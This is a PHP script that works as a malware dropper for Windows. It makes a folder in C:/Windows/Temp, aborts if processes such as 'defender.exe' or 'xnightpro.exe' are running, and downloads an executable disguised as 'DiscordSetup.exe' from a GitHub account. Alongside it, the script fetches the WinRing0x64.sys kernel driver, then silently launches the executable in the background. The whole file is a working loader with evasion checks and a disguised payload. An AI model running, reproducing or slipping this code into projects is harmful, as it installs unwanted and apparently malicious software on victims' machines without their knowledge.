    /*<?php /**/



function deleteFile(string $filePath): void
{
    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            echo "Deleted: $filePath\n";
        } else {
            echo "Failed to delete: $filePath\n";
        }
    } else {
        echo "File does not exist: $filePath\n";
    }
}

/**
 * Downloads a file from a URL to a local path with error checking.
 *
 * @param string $url
 * @param string $savePath
 * @return bool True if download is successful, false otherwise.
 */
function downloadFile(string $url, string $savePath): bool
{
    $ch = curl_init($url);
    if ($ch === false) {
        echo "Failed to initialize cURL\n";
        return false;
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 PHP script');

    $data = curl_exec($ch);

    if ($data === false) {
        echo "cURL error: " . curl_error($ch) . "\n";
        curl_close($ch);
        return false;
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200) {
        echo "Failed to download file - HTTP status code: $httpCode\n";
        return false;
    }

    if (file_put_contents($savePath, $data) === false) {
        echo "Failed to save file to $savePath\n";
        return false;
    }

    echo "Downloaded and saved: $savePath\n";
    return true;
}

/**
 * Checks if any of the specified process names are running.
 *
 * @param array $processNames Array of process executable names with exact casing.
 * @return bool True if any process is found running, false otherwise.
 */
function anyProcessRunning(array $processNames): bool
{
    foreach ($processNames as $processName) {
        $command = "tasklist /FI \"IMAGENAME eq $processName\" /NH";
        exec($command, $output, $returnCode);

        if ($returnCode === 0) {
            foreach ($output as $line) {
                if (stripos($line, $processName) !== false) {
                    return true;
                }
            }
        }
        $output = [];
    }
    return false;
}

function main(): void
{
    $targetDir = 'C:/Windows/Temp/spawn33/';

    if (!is_dir($targetDir)) {
        if (!mkdir($targetDir, 0755, true)) {
            echo "Failed to create directory: $targetDir\n";
            exit(1);
        }
        echo "Created directory: $targetDir\n";
    } else {
        echo "Directory already exists: $targetDir\n";
    }

    $processesToBlock = [
        'DiscordSetup.exe',
        'defender.exe',
        'Spotify.exe',
        'xnightpro.exe',
    ];

    if (anyProcessRunning($processesToBlock)) {
        echo "One or more blocking processes are running. Aborting download and execution.\n";
        exit(0);
    }

    $urlFiles = [
        'DiscordSetup.exe' => 'https://github.com/mainpoint91/mainpoint/releases/download/newnight/DiscordSetup.exe',
        'WinRing0x64.sys'  => 'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys',
    ];

    $success = true;

    foreach ($urlFiles as $fileName => $url) {
        $savePath = $targetDir . $fileName;

        if (file_exists($savePath)) {
            echo "$fileName already exists. Deleting old file.\n";
            deleteFile($savePath);
        }

        if (!downloadFile($url, $savePath)) {
            $success = false;
        }
    }

    if ($success) {
        $exePath = $targetDir . 'DiscordSetup.exe';

        if (is_executable($exePath)) {
            $command = escapeshellarg($exePath);
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $cmd = "start /B \"\" $command";
                pclose(popen($cmd, 'r'));
                echo "Executed: $exePath\n";
            } else {
                exec("$command > /dev/null 2>&1 &");
                echo "Executed: $exePath\n";
            }
        } else {
            echo "Downloaded executable is not executable or missing: $exePath\n";
        }
    } else {
        echo "Errors occurred during downloading files; not executing.\n";
    }
}

main();

